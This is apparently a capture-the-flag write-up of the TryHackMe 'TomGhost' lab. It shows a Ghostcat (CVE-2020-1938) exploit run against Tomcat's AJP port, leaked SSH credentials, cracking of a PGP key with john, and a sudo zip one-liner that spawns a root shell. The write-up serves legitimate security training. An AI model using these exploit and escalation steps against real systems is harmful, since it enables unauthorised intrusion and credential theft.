# TomGhost (THM)

- https://tryhackme.com/room/tomghost
- March 4, 2023
- easy

---

## Enumeration

### Nmap

1. 22/ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
2. 53/tcpwrapped
3. 161/tcp
4. 911/tcp
5. 5405/tcp
6. 8009/tcp ajp13 Apache Jserv
7. 8080/tcp http Apache Tomcat 9.0.30

- This apache has known exploit
- CNVD-2020-10487(CVE-2020-1938)
- exploit link - https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py

```sh
$ python ajpShooter.py http://$IP 8009 /WEB-INF/web.xml read

       _    _         __ _                 _
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|
         |__/|_|
                                                00theway,just for test


[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1261-1583902632000"
[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1261

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>

```

## User Access

- Get account credential
  `skyfuck:8730281lkjlkjdqlksalks`
- there is ssh port open and try to enter ssh

```sh
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```

- get these two files which may also be credentials to local machine to crack
- tryhackme.asc is PGP Private Key
- to crack with john firt change asc file to john format

```sh
$ /opt/tools/john/run/gpg2john tryhackme.asc > forjohn.txt
$ john forjohn.txt
# tryhackme:alexandru:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
$ gpg --import tryhackme.asc
# enter passphrase: alexandru
$ gpg --decrypt credential.pgp
# gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
# gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
#       "tryhackme <stuxnet@tryhackme.com>"
# merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

- get merlin account

```sh
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

- merlin has sudo access to zip file without password

## Root Access

- from gtfobin for zip

```sh
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

- get root access

```sh
root@ubuntu:/# cat /home/merlin/user.txt
...
root@ubuntu:/# cat /root/root.txt
...
```

---
